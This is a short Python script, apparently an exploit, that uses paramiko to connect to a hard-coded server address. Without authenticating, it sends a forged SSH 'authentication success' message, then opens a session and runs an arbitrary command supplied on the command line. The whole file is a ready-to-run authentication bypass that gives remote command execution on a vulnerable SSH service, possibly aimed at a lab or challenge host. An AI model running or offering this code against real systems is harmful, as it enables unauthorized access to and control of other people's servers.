import sys
import paramiko
import socket

s = socket.socket()
s.connect(("13.234.11.113",31133))
m = paramiko.message.Message()
t = paramiko.transport.Transport(s)
t.start_client()
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c = t.open_session(timeout=5)
c.exec_command(sys.argv[1])
out = c.makefile("rb",2048)
output = out.read()
out.close()
print (output)
